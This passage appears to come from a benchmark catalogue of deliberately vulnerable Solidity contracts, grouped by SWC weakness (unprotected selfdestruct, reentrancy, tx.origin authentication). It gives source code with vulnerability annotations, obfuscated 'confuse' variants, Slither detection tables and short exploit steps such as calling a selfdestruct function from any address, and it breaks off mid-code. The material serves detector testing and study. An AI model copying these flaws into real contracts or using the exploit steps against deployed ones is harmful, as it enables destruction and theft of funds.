        // Asserts are used to use static analysis to find bugs in your code. They should never fail
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    /**
     * Transfer tokens
     *
     * Send `_value` tokens to `_to` from your account
     *
     * @param _to The address of the recipient
     * @param _value the amount to send
     */
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    /**
     * Transfer tokens from other address
     *
     * Send `_value` tokens to `_to` in behalf of `_from`
     *
     * @param _from The address of the sender
     * @param _to The address of the recipient
     * @param _value the amount to send
     */
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    /**
     * Set allowance for other address
     *
     * Allows `_spender` to spend no more than `_value` tokens in your behalf
     *
     * @param _spender The address authorized to spend
     * @param _value the max amount they can spend
     */
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    /**
     * Set allowance for other address and notify
     *
     * Allows `_spender` to spend no more than `_value` tokens in your behalf, and then ping the contract about it
     *
     * @param _spender The address authorized to spend
     * @param _value the max amount they can spend
     * @param _extraData some extra information to send to the approved contract
     */
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    /**
     * Destroy tokens
     *
     * Remove `_value` tokens from the system irreversibly
     *
     * @param _value the amount of money to burn
     */
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   // Check if the sender has enough
        balanceOf[msg.sender] -= _value;            // Subtract from the sender
        totalSupply -= _value;                      // Updates totalSupply
        Burn(msg.sender, _value);
        return true;
    }

    /**
     * Destroy tokens from other account
     *
     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.
     *
     * @param _from the address of the sender
     * @param _value the amount of money to burn
     */
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                // Check if the targeted balance is enough
        require(_value <= allowance[_from][msg.sender]);    // Check allowance
        balanceOf[_from] -= _value;                         // Subtract from the targeted balance
        allowance[_from][msg.sender] -= _value;             // Subtract from the sender's allowance
        totalSupply -= _value;                              // Update totalSupply
        Burn(_from, _value);
        return true;
    }
}

/******************************************/
/*       ADVANCED TOKEN STARTS HERE       */
/******************************************/

contract MyAdvancedToken is owned, TokenERC20 {

    uint256 public sellPrice;
    uint256 public buyPrice;

    mapping (address => bool) public frozenAccount;

    /* This generates a public event on the blockchain that will notify clients */
    event FrozenFunds(address target, bool frozen);

    /* Initializes contract with initial supply tokens to the creator of the contract */
    function MyAdvancedToken(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) TokenERC20(initialSupply, tokenName, tokenSymbol) public {}

    /* Internal transfer, only can be called by this contract */
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);                               // Prevent transfer to 0x0 address. Use burn() instead
        require (balanceOf[_from] >= _value);               // Check if the sender has enough
        require (balanceOf[_to] + _value >= balanceOf[_to]); // Check for overflows
        require(!frozenAccount[_from]);                     // Check if sender is frozen
        require(!frozenAccount[_to]);                       // Check if recipient is frozen
        balanceOf[_from] -= _value;                         // Subtract from the sender
        balanceOf[_to] += _value;                           // Add the same to the recipient
        Transfer(_from, _to, _value);
    }

    /// @notice Create `mintedAmount` tokens and send it to `target`
    /// @param target Address to receive the tokens
    /// @param mintedAmount the amount of tokens it will receive
    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        Transfer(0, this, mintedAmount);
        Transfer(this, target, mintedAmount);
    }

    /// @notice `freeze? Prevent | Allow` `target` from sending & receiving tokens
    /// @param target Address to be frozen
    /// @param freeze either to freeze it or not
    function freezeAccount(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }

    /// @notice Allow users to buy tokens for `newBuyPrice` eth and sell tokens for `newSellPrice` eth
    /// @param newSellPrice Price the users can sell to the contract
    /// @param newBuyPrice Price users can buy from the contract
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }

    /// @notice Buy tokens from contract by sending ether
    function buy() payable public {
        uint amount = msg.value / buyPrice;               // calculates the amount
        _transfer(this, msg.sender, amount);              // makes the transfers
    }

    /// @notice Sell `amount` tokens to contract
    /// @param amount amount of tokens to be sold
    function sell(uint256 amount) public {
        require(this.balance >= amount * sellPrice);      // checks if the contract has enough ether to buy
        _transfer(msg.sender, this, amount);              // makes the transfers
        msg.sender.transfer(amount * sellPrice);          // sends ether to the seller. It's important to do this last to avoid recursion attacks
    }
	
    function () payable public {
    		uint amount = msg.value * buyPrice;               // calculates the amount
    		_transfer(owner, msg.sender, amount);
    }
    
    function selfdestructs() payable public {
    		selfdestruct(owner);
    }
    
    function getEth(uint num) payable public {
    	owner.transfer(num);
    }
	
	function newinitialSupply(uint256 _initialSupply) public onlyOwner {
	    totalSupply = _initialSupply;
	}

}
```

#### Exploit

1. deploy contract `MyAdvancedToken` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `selfdestructs` by any address

### 6. 2020-19769&BurnMe

#### Source Code

```javascript
/**
 *Submitted for verification at Etherscan.io on 2018-07-17
*/

pragma solidity ^0.4.18;


/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public owner;


    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    function Ownable() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param newOwner The address to transfer ownership to.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

}

contract TXOtoken {
    function transfer(address to, uint256 value) public returns (bool);
}

contract GetsBurned {

    function () payable {
    }

    function BurnMe () public {
        // Selfdestruct and send eth to self,
        selfdestruct(address(this));
    }
}

/**
 * @title TREON token sale
 * @dev This contract receives money. Redirects money to the wallet. Verifies the correctness of transactions.
 * @dev Does not produce tokens. All tokens are sent manually, after approval.
 */
contract TXOsaleTwo is Ownable {

    event ReceiveEther(address indexed from, uint256 value);

    TXOtoken public token = TXOtoken(0xe3e0CfBb19D46DC6909C6830bfb25107f8bE5Cb7);

    bool public goalAchieved = false;

    address public constant wallet = 0x8dA7477d56c90CF2C5b78f36F9E39395ADb2Ae63;
    //  Thursday, 17-Jul-18 00:00:00 UTC
    uint public  constant saleStart = 1531785600;
    // Monday, 31-Dec-18 23:59:59 UTC
    uint public constant saleEnd = 1546300799;

    function TXOsaleTwo() public {

    }

    /**
    * @dev fallback function
    */
    function() public payable {
        require(now >= saleStart && now <= saleEnd);
        require(!goalAchieved);
        require(msg.value >= 0.1 ether);
        require(msg.value <= 65 ether);
        wallet.transfer(msg.value);
        emit ReceiveEther(msg.sender, msg.value);
    }

    /**
     * @dev The owner can suspend the sale if the HardCap has been achieved.
     */
    function setGoalAchieved(bool _goalAchieved) public onlyOwner {
        goalAchieved = _goalAchieved;
    }

    function burnToken(uint256 value) public onlyOwner{
        GetsBurned burnContract = new GetsBurned();
        token.transfer(burnContract,  value);
        burnContract.BurnMe();
    }
}
```

#### Exploit

1. deploy contract `GetsBurned` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `BurnMe` by any address

### 7. parity_wallet_bug_2&kill

#### Source Code

```javascript
/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-106#walletlibrarysol
 * @author: -
 * @vulnerable_at_lines: 226,233
 */

//sol Wallet
// Multi-sig, daily-limited account proxy/wallet.
// @authors:
// Gav Wood <g@ethdev.com>
// inheritable "property" contract that enables methods to be protected by requiring the acquiescence of either a
// single, or, crucially, each of a number of, designated owners.
// usage:
// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by
// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the
// interior is executed.

pragma solidity ^0.4.9;

contract WalletEvents {
  // EVENTS

  // this contract only has six types of events: it can accept a confirmation, in which case
  // we record owner and operation (hash) alongside it.
  event Confirmation(address owner, bytes32 operation);
  event Revoke(address owner, bytes32 operation);

  // some others are in the case of an owner changing.
  event OwnerChanged(address oldOwner, address newOwner);
  event OwnerAdded(address newOwner);
  event OwnerRemoved(address oldOwner);

  // the last one is emitted if the required signatures change
  event RequirementChanged(uint newRequirement);

  // Funds has arrived into the wallet (record how much).
  event Deposit(address _from, uint value);
  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).
  event SingleTransact(address owner, uint value, address to, bytes data, address created);
  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).
  event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);
  // Confirmation still needed for a transaction.
  event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);
}

contract WalletAbi {
  // Revokes a prior confirmation of the given operation
  function revoke(bytes32 _operation) external;

  // Replaces an owner `_from` with another `_to`.
  function changeOwner(address _from, address _to) external;

  function addOwner(address _owner) external;

  function removeOwner(address _owner) external;

  function changeRequirement(uint _newRequired) external;

  function isOwner(address _addr) constant returns (bool);

  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);

  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.
  function setDailyLimit(uint _newLimit) external;

  function execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);
  function confirm(bytes32 _h) returns (bool o_success);
}

contract WalletLibrary is WalletEvents {
  // TYPES

  // struct for the status of a pending operation.
  struct PendingState {
    uint yetNeeded;
    uint ownersDone;
    uint index;
  }

  // Transaction structure to remember details of transaction lest it need be saved for a later call.
  struct Transaction {
    address to;
    uint value;
    bytes data;
  }

  // MODIFIERS

  // simple single-sig function modifier.
  modifier onlyowner {
    if (isOwner(msg.sender))
      _;
  }
  // multi-sig function modifier: the operation must have an intrinsic hash in order
  // that later attempts can be realised as the same underlying operation and
  // thus count as confirmations.
  modifier onlymanyowners(bytes32 _operation) {
    if (confirmAndCheck(_operation))
      _;
  }

  // METHODS

  // gets called when no other function matches
  function() payable {
    // just being sent some cash?
    if (msg.value > 0)
      Deposit(msg.sender, msg.value);
  }

  // constructor is given number of sigs required to do protected "onlymanyowners" transactions
  // as well as the selection of addresses capable of confirming them.
  function initMultiowned(address[] _owners, uint _required) only_uninitialized {
    m_numOwners = _owners.length + 1;
    m_owners[1] = uint(msg.sender);
    m_ownerIndex[uint(msg.sender)] = 1;
    for (uint i = 0; i < _owners.length; ++i)
    {
      m_owners[2 + i] = uint(_owners[i]);
      m_ownerIndex[uint(_owners[i])] = 2 + i;
    }
    m_required = _required;
  }

  // Revokes a prior confirmation of the given operation
  function revoke(bytes32 _operation) external {
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    // make sure they're an owner
    if (ownerIndex == 0) return;
    uint ownerIndexBit = 2**ownerIndex;
    var pending = m_pending[_operation];
    if (pending.ownersDone & ownerIndexBit > 0) {
      pending.yetNeeded++;
      pending.ownersDone -= ownerIndexBit;
      Revoke(msg.sender, _operation);
    }
  }

  // Replaces an owner `_from` with another `_to`.
  function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {
    if (isOwner(_to)) return;
    uint ownerIndex = m_ownerIndex[uint(_from)];
    if (ownerIndex == 0) return;

    clearPending();
    m_owners[ownerIndex] = uint(_to);
    m_ownerIndex[uint(_from)] = 0;
    m_ownerIndex[uint(_to)] = ownerIndex;
    OwnerChanged(_from, _to);
  }

  function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    if (isOwner(_owner)) return;

    clearPending();
    if (m_numOwners >= c_maxOwners)
      reorganizeOwners();
    if (m_numOwners >= c_maxOwners)
      return;
    m_numOwners++;
    m_owners[m_numOwners] = uint(_owner);
    m_ownerIndex[uint(_owner)] = m_numOwners;
    OwnerAdded(_owner);
  }

  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    uint ownerIndex = m_ownerIndex[uint(_owner)];
    if (ownerIndex == 0) return;
    if (m_required > m_numOwners - 1) return;

    m_owners[ownerIndex] = 0;
    m_ownerIndex[uint(_owner)] = 0;
    clearPending();
    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot
    OwnerRemoved(_owner);
  }

  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {
    if (_newRequired > m_numOwners) return;
    m_required = _newRequired;
    clearPending();
    RequirementChanged(_newRequired);
  }

  // Gets an owner by 0-indexed position (using numOwners as the count)
  function getOwner(uint ownerIndex) external constant returns (address) {
    return address(m_owners[ownerIndex + 1]);
  }

  function isOwner(address _addr) constant returns (bool) {
    return m_ownerIndex[uint(_addr)] > 0;
  }

  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {
    var pending = m_pending[_operation];
    uint ownerIndex = m_ownerIndex[uint(_owner)];

    // make sure they're an owner
    if (ownerIndex == 0) return false;

    // determine the bit to set for this owner.
    uint ownerIndexBit = 2**ownerIndex;
    return !(pending.ownersDone & ownerIndexBit == 0);
  }

  // constructor - stores initial daily limit and records the present day's index.
  function initDaylimit(uint _limit) only_uninitialized {
    m_dailyLimit = _limit;
    m_lastDay = today();
  }
  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.
  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {
    m_dailyLimit = _newLimit;
  }
  // resets the amount already spent today. needs many of the owners to confirm.
  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {
    m_spentToday = 0;
  }

  // throw unless the contract is not yet initialized.
  modifier only_uninitialized { if (m_numOwners > 0) throw; _; }

  // constructor - just pass on the owner array to the multiowned and
  // the limit to daylimit
  // <yes> <report> ACCESS_CONTROL
  function initWallet(address[] _owners, uint _required, uint _daylimit) only_uninitialized {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }

  // kills the contract sending everything to `_to`.
  // <yes> <report> ACCESS_CONTROL
  function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
  }

  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.
  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide
  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value
  // and _data arguments). They still get the option of using them if they want, anyways.
  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {
    // first, take the opportunity to check that we're under the daily limit.
    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {
      // yes - just execute the call.
      address created;
      if (_to == 0) {
        created = create(_value, _data);
      } else {
        if (!_to.call.value(_value)(_data))
          throw;
      }
      SingleTransact(msg.sender, _value, _to, _data, created);
    } else {
      // determine our operation hash.
      o_hash = sha3(msg.data, block.number);
      // store if it's new
      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {
        m_txs[o_hash].to = _to;
        m_txs[o_hash].value = _value;
        m_txs[o_hash].data = _data;
      }
      if (!confirm(o_hash)) {
        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);
      }
    }
  }

  function create(uint _value, bytes _code) internal returns (address o_addr) {
    /*
    assembly {
      o_addr := create(_value, add(_code, 0x20), mload(_code))
      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))
    }
    */
  }

  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order
  // to determine the body of the transaction from the hash provided.
  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {
    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {
      address created;
      if (m_txs[_h].to == 0) {
        created = create(m_txs[_h].value, m_txs[_h].data);
      } else {
        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
          throw;
      }

      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);
      delete m_txs[_h];
      return true;
    }
  }

  // INTERNAL METHODS

  function confirmAndCheck(bytes32 _operation) internal returns (bool) {
    // determine what index the present sender is:
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    // make sure they're an owner
    if (ownerIndex == 0) return;

    var pending = m_pending[_operation];
    // if we're not yet working on this operation, switch over and reset the confirmation status.
    if (pending.yetNeeded == 0) {
      // reset count of confirmations needed.
      pending.yetNeeded = m_required;
      // reset which owners have confirmed (none) - set our bitmap to 0.
      pending.ownersDone = 0;
      pending.index = m_pendingIndex.length++;
      m_pendingIndex[pending.index] = _operation;
    }
    // determine the bit to set for this owner.
    uint ownerIndexBit = 2**ownerIndex;
    // make sure we (the message sender) haven't confirmed this operation previously.
    if (pending.ownersDone & ownerIndexBit == 0) {
      Confirmation(msg.sender, _operation);
      // ok - check if count is enough to go ahead.
      if (pending.yetNeeded <= 1) {
        // enough confirmations: reset and run interior.
        delete m_pendingIndex[m_pending[_operation].index];
        delete m_pending[_operation];
        return true;
      }
      else
      {
        // not enough: record that this owner in particular confirmed.
        pending.yetNeeded--;
        pending.ownersDone |= ownerIndexBit;
      }
    }
  }

  function reorganizeOwners() private {
    uint free = 1;
    while (free < m_numOwners)
    {
      while (free < m_numOwners && m_owners[free] != 0) free++;
      while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;
      if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)
      {
        m_owners[free] = m_owners[m_numOwners];
        m_ownerIndex[m_owners[free]] = free;
        m_owners[m_numOwners] = 0;
      }
    }
  }

  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and
  // returns true. otherwise just returns false.
  function underLimit(uint _value) internal onlyowner returns (bool) {
    // reset the spend limit if we're on a different day to last time.
    if (today() > m_lastDay) {
      m_spentToday = 0;
      m_lastDay = today();
    }
    // check to see if there's enough left - if so, subtract and return true.
    // overflow protection                    // dailyLimit check
    if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {
      m_spentToday += _value;
      return true;
    }
    return false;
  }

  // determines today's index.
  function today() private constant returns (uint) { return now / 1 days; }

  function clearPending() internal {
    uint length = m_pendingIndex.length;

    for (uint i = 0; i < length; ++i) {
      delete m_txs[m_pendingIndex[i]];

      if (m_pendingIndex[i] != 0)
        delete m_pending[m_pendingIndex[i]];
    }

    delete m_pendingIndex;
  }

  // FIELDS
  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;

  // the number of owners that must confirm the same operation before it is run.
  uint public m_required;
  // pointer used to find a free slot in m_owners
  uint public m_numOwners;

  uint public m_dailyLimit;
  uint public m_spentToday;
  uint public m_lastDay;

  // list of owners
  uint[256] m_owners;

  uint constant c_maxOwners = 250;
  // index on the list of owners to allow reverse lookup
  mapping(uint => uint) m_ownerIndex;
  // the ongoing operations.
  mapping(bytes32 => PendingState) m_pending;
  bytes32[] m_pendingIndex;

  // pending transactions we have at present.
  mapping (bytes32 => Transaction) m_txs;
}

```

#### Exploit*

1. deploy contract `WalletLibrary` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. ?



### 8. simple_suicide_confuse&Ox6c6be552d755b34fe8c36483e9a25e4afd353244

#### Source Code

```javascript
pragma solidity ^0.4.0;

contract Ox91d1f79fd78cae67b92b17568b2d1cf8466f8d22 {
    function Ox9fec079c615c1793bd54dd99e4406c18ce6dd615() public {
        uint Ox91f5986e4870d2ac373bb49bfd7c744035b53238 = (1 * 8) * 1 * 3 - 23;
        while (
            Ox91f5986e4870d2ac373bb49bfd7c744035b53238 != 3 * 3 + 6 * 7 - 51
        ) {
            if (
                Ox91f5986e4870d2ac373bb49bfd7c744035b53238 ==
                8 * 7 + 7 * 8 - 111
            ) /*ACCESS_CONTROL*/ {
                selfdestruct(msg.sender);
                Ox91f5986e4870d2ac373bb49bfd7c744035b53238 =
                    2 +
                    (4 + 4 + 9) -
                    19;
            }
        }
    }

    function Ox08ddcf1f97c315eaf9c8638ca8a1068b660b7d45(
        uint256 Ox9042c9c76658118d882b0ed772eccf0d8e9b2795
    ) internal view returns (uint256) {
        return
            Ox28c47ccdab585eb46b897eb642532204dba434bd[
                Ox9042c9c76658118d882b0ed772eccf0d8e9b2795
            ];
    }

    uint256[] public Ox28c47ccdab585eb46b897eb642532204dba434bd = [
        8 + (5 + 3) * 1 - 16,
        3 + 1 + 4 * 7 - 31
    ];
}

```

#### Exploit

1. deploy contract `Ox91d1f79fd78cae67b92b17568b2d1cf8466f8d22` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `Ox9fec079c615c1793bd54dd99e4406c18ce6dd615` by any address



### 9. simple_suicide.sol_confuse&Ox9fec079c615c1793bd54dd99e4406c18ce6dd615

#### Source Code

```javascript
pragma solidity ^0.4.0;

contract Ox91d1f79fd78cae67b92b17568b2d1cf8466f8d22 {
    function Ox9fec079c615c1793bd54dd99e4406c18ce6dd615() public {
        uint Ox91f5986e4870d2ac373bb49bfd7c744035b53238 = (1 * 8) * 1 * 3 - 23;
        while (
            Ox91f5986e4870d2ac373bb49bfd7c744035b53238 != 3 * 3 + 6 * 7 - 51
        ) {
            if (
                Ox91f5986e4870d2ac373bb49bfd7c744035b53238 ==
                8 * 7 + 7 * 8 - 111
            ) /*ACCESS_CONTROL*/ {
                selfdestruct(msg.sender);
                Ox91f5986e4870d2ac373bb49bfd7c744035b53238 =
                    2 +
                    (4 + 4 + 9) -
                    19;
            }
        }
    }

    function Ox08ddcf1f97c315eaf9c8638ca8a1068b660b7d45(
        uint256 Ox9042c9c76658118d882b0ed772eccf0d8e9b2795
    ) internal view returns (uint256) {
        return
            Ox28c47ccdab585eb46b897eb642532204dba434bd[
                Ox9042c9c76658118d882b0ed772eccf0d8e9b2795
            ];
    }

    uint256[] public Ox28c47ccdab585eb46b897eb642532204dba434bd = [
        8 + (5 + 3) * 1 - 16,
        3 + 1 + 4 * 7 - 31
    ];
}

```

#### Exploit

1. deploy contract `Ox91d1f79fd78cae67b92b17568b2d1cf8466f8d22` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `Ox9fec079c615c1793bd54dd99e4406c18ce6dd615` by any address



### 10. suicide_multitx_feasible_confuse&Oxf6e446fc9c49afb6ce3d283f4df427dc0c6d4a1e

#### Source Code

```javascript
pragma solidity ^0.4.23;

contract Oxbf94903192b6ffafce0c5fcf080c93dd3228c507 {
    function Ox8ea20defd68c298b50c558042810b83bc104b97e() public {
        Ox196cff32ed689d10c6587e05a8da2e2c4915bcd6
            .Oxcd32744f05522aee60669dd1884d6213685329c4 = uint256(
            Ox119921aca607b3f87e1655c2b5ad0e62dd581d80(7 + 1 + 2 * 6 - 19)
        );
    }

    function Oxf6e446fc9c49afb6ce3d283f4df427dc0c6d4a1e(
        uint256 Oxbc7be05ece3634df6114c08c40a766a6fe6baec3
    ) {
        if (
            Ox196cff32ed689d10c6587e05a8da2e2c4915bcd6
                .Oxcd32744f05522aee60669dd1884d6213685329c4 ==
            Ox119921aca607b3f87e1655c2b5ad0e62dd581d80((8 - 2 - 4) + 1 - 3)
        ) {
            return;
        }
        selfdestruct(msg.sender);
    }

    function Ox119921aca607b3f87e1655c2b5ad0e62dd581d80(
        uint256 Ox770d7fc514e08174ad49587abd43ba6d9faf8025
    ) internal view returns (uint256) {
        return
            Oxcb9f64db1b6e391de4781acca35f3602f95b3761[
                Ox770d7fc514e08174ad49587abd43ba6d9faf8025
            ];
    }

    uint256[] public Oxcb9f64db1b6e391de4781acca35f3602f95b3761 = [
        5 + 3 * 6 + 7 - 30,
        7 * 2 * 9 * 5 - 629
    ];
    struct scalar2Vector {
        uint256 Oxd7d01661a068f1043e634995081edc302b5a0e6d;
        uint256 Oxcd32744f05522aee60669dd1884d6213685329c4;
    }
    scalar2Vector Ox196cff32ed689d10c6587e05a8da2e2c4915bcd6 =
        scalar2Vector(
            uint256(
                Ox119921aca607b3f87e1655c2b5ad0e62dd581d80(8 * 3 + 5 * 4 - 43)
            ),
            uint256(
                Ox119921aca607b3f87e1655c2b5ad0e62dd581d80(3 * 1 * (7 + 3) - 30)
            )
        );
}

```

#### Exploit

1. deploy contract `Oxbf94903192b6ffafce0c5fcf080c93dd3228c507` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `Ox8ea20defd68c298b50c558042810b83bc104b97e` by any address
3. call function `Oxf6e446fc9c49afb6ce3d283f4df427dc0c6d4a1e` by any address with arguments `0` 

## SWC107: REN (31 funcs, 33 files)

| No.  | file_name&vul_function_name                                 |
| ---- | ----------------------------------------------------------- |
| 1    | spank_chain_payment&LCOpenTimeout                           |
| 2    | simple_dao&withdraw                                         |
| 3    | reentrancy_simple&withdrawBalance                           |
| 4    | reentrancy_insecure&withdrawBalance                         |
| 5    | reentrancy_dao&withdrawAll                                  |
| 6    | reentrancy_cross_function&withdrawBalance                   |
| 7    | reentrancy_bonus&getFirstWithdrawalBonus                    |
| 8    | reentrance&withdraw                                         |
| 9    | modifier_reentrancy&airDrop                                 |
| 10   | etherstore&withdrawFunds                                    |
| 11   | etherbank&withdrawBalance                                   |
| 12   | 0xf015c35649c82f5467c9c74b7f28ee67665aad68&Collect          |
| 13   | 0xcead721ef5b11f1a7b530171aab69b16c5e66b6e&Collect          |
| 14   | 0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888&Collect          |
| 15   | 0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f&CashOut          |
| 16   | 0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e&CashOut          |
| 17   | 0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12&CashOut          |
| 18   | 0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8&Collect          |
| 19   | 0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b&Collect          |
| 20   | 0x941d225236464a25eb18076df7da6a91d0f95e9e&CashOut          |
| 21   | 0x93c32845fae42c83a70e5f06214c8433665c2ab5&Collect          |
| 22   | 0x8c7777c45481dba411450c228cb692ac3d550344&CashOut          |
| 23   | 0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3&Collect          |
| 24   | 0x7a8721a9d64c74da899424c1b52acbf58ddc9782&CashOut          |
| 25   | 0x7541b76cb60f4c60af330c208b0623b7f54bf615&Collect          |
| 26   | 0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839&WithdrawToHolder |
| 27   | 0x561eac93c92360949ab1f1403323e6db345cbf31&Collect          |
| 28   | 0x4e73b32ed6c35f570686b89848e5f39f20ecc106&Collect          |
| 29   | 0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1&Collect          |
| 30   | 0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4&CashOut          |
| 31   | 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f&Collect          |



//TODO

## SWC115: TXO (18 funcs, 19 files)

| No.  | file_name&vul_function_name                                  | FIxed Method | Slither |
| ---- | ------------------------------------------------------------ | ------------ | ------- |
| 1    | phishable&withdrawAll                                        |              | Yes     |
| 2    | phishable_confuse&Ox99fadf393d7057b9c32f495a906f4b5493c96c77 |              | Yes     |
| 3    | phishable.sol_confuse&Ox9b1b08cba67a2c9c6378a0ea4aea85a58c3240ff |              | Yes     |
| 4    | phishable_variant_1&variantWithdrawAll                       |              | Yes     |
| 5    | phishable_variant_1_confuse&Oxc7771813a253097a5c4aa43bb3751e5be949ac37 |              | Yes     |
| 6    | phishable_variant_2&withdrawAll                              |              | Yes     |
| 7    | phishable_variant_2_confuse&Oxd5984abc60a206d5fb5d1a4990f35534f264c9c6 |              | Yes     |
| 8    | phishable_variant_3&withdrawAll                              |              | No      |
| 9    | phishable_variant_3_confuse&Ox25b8466d602067ea97e4b7d8673a20280337e88d |              | No      |
| 10   | mycontract&sendTo                                            | SWC          | Yes     |
| 11   | mycontract_confuse&Ox2d6efb91e5366a7152910796a19a91d42a13693d |              | Yes     |
| 12   | mycontract.sol_confuse&Oxb3893c1f4ee789f5757dae823c3aa5ac82829a64 | Manual       | No      |
| 13   | mycontract_variant_1&variantSendTo                           |              | Yes     |
| 14   | mycontract_variant_1_confuse&Oxc1135d97bb8f4b5569e7c76aef4f433c91b57722 |              | Yes     |
| 15   | mycontract_variant_2&sendTo                                  |              | Yes     |
| 16   | mycontract_variant_2_confuse&Ox3dda3625b8820b902b92bf0429aac3f7b5bbf1dd |              | Yes     |
| 17   | mycontract_variant_3&sendTo                                  |              | No      |
| 18   | mycontract_variant_3_confuse&Oxb6558714d8ec0f6c2d1f96eae271d6131968aace |              | No      |



### 1. phishable&withdrawAll

#### Source Code

```javascript
/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 20
 */

 pragma solidity ^0.4.22;

 contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner);
        _recipient.transfer(this.balance);
    }
}

```

#### Exploit (payable)

```javascript
/*
